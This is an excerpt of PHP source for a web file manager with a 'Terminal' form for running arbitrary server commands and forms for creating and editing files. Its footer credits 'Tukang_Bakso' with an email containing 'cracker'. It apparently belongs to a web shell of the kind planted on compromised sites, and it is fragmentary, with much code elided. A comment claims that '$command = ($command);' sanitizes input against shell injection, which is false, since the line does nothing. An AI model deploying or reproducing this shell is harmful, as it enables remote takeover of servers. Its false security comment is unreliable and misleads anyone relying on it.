...
if (isset($_GET['cmd'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
        ...
        $command = ($command); // Sanitasi perintah untuk mencegah injeksi shell
        $output = [];
        $return_var = 0;
        ...
        if ($return_var === 0) {
            fm_set_msg('Command executed successfully', 'success');
        } else {
            fm_set_msg('Command execution failed with status: ' . $return_var, 'error');
        }
    }
    ...
    ?>
    <div class="path">
        <p class="break-word"><b>Terminal</b></p>
        <form action="" method="post">
            <label for="command">Command:</label>
            <input type="text" name="command" id="command" required style="width:100%;"><br><br>
            <button type="submit" class="btn"><i class="icon-apply"></i> Execute Command</button>
...
if (isset($_GET['newfile'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
        ...
        $filename = fm_clean_path($filename);
        ...
        if ($filename == '') {
            fm_set_msg('File name cannot be empty', 'error');
        } elseif (is_file($path . '/' . $filename)) {
            fm_set_msg('File already exists', 'error');
        } else {
            $new_file_path = $path . '/' . $filename;
            if (file_put_contents($new_file_path, '') !== false) {
                fm_set_msg('File created successfully', 'success');
                fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH) . '&edit=' . urlencode($filename));
            } else {
                fm_set_msg('Failed to create file', 'error');
            }
        }
    }
    ...
    ?>
    <div class="path">
        <p class="break-word"><b>Create New File</b></p>
        <form action="" method="post">
            <label for="filename">File Name:</label>
            <input type="text" name="filename" id="filename" required style="width:100%;"><br><br>
            <button type="submit" class="btn"><i class="icon-save"></i> Create File</button>
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-goback"></i> Back</a></b>
        </form>
    </div>
    <?php
...
if (isset($_GET['edit'])) {
    ...
    if (!in_array($ext, fm_get_text_exts()) && substr($mime_type, 0, 4) != 'text') {
        fm_set_msg('This file type cannot be edited', 'error');
        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
    }
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        ...
        if (function_exists('iconv') && !$is_utf8) {
            $new_content = iconv('UTF-8', FM_ICONV_INPUT_ENC . '//IGNORE', $new_content);
        }

        if (file_put_contents($file_path, $new_content) !== false) {
            fm_set_msg('File successfully edited', 'success');
        } else {
            fm_set_msg('Failed to edit file', 'error');
        }
        fm_redirect(FM_SELF_URL . '?p=' . urlencode(FM_PATH));
    }
    ...
    ?>
    <div class="path">
        <p class="break-word"><b>Editing "<?php echo fm_enc(fm_convert_win($file)) ?>"</b></p>
        <form action="" method="post">
            <textarea name="content" rows="20" style="width:100%;"><?php echo htmlspecialchars($content) ?></textarea><br>
            <button type="submit" class="btn"><i class="icon-save"></i> Save Changes</button>
            <b><a href="?p=<?php echo urlencode(FM_PATH) ?>"><i class="icon-goback"></i> Back</a></b>
        </form>
    </div>
    <?php
...
<a title="Edit" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;edit=<?php echo urlencode(trim(FM_PATH . '/' . $f, '/')) ?>"><i class="icon-file_code"></i></a>
...
<a title="Terminal" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;cmd"><i class="icon-file_terminal"></i></a>
<a title="New folder" href="#" onclick="newfolder('<?php echo fm_enc(FM_PATH) ?>');return false;"><i class="icon-folder_add"></i></a>
<a title="New file" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;newfile"><i class="icon-document"></i></a>
...
<style>
/* Reset default styling for common HTML elements */
...
/* Code block and preformatted text styling */
code, pre {
    display: block;
    margin-bottom: 10px;
...
/* Message types: success, error, alert */
.message.ok {
    border-color: green;
    color: green;
}
...
.preview-video {
    ...
    max-width: 100%;
    height: 0;
    padding-bottom: 62.5%; /* Aspect ratio 16:9 */
    margin-bottom: 10px;
}
.preview-video video {
    position: absolute;
...
/* Icon styling for various elements */
[class*="icon-"] {
...
/* Icon classes for specific actions */
...
/* Filename display with ellipsis for overflow */
.filename {
    max-width: 420px;
    white-space: nowrap;
    overflow: hidden;
...
{
    ?>
<p class="center"><small><a href="mailto:cracker1928@gmail.com" target="_blank">Tukang_Bakso</a></center></small></p>
</div>
<script>
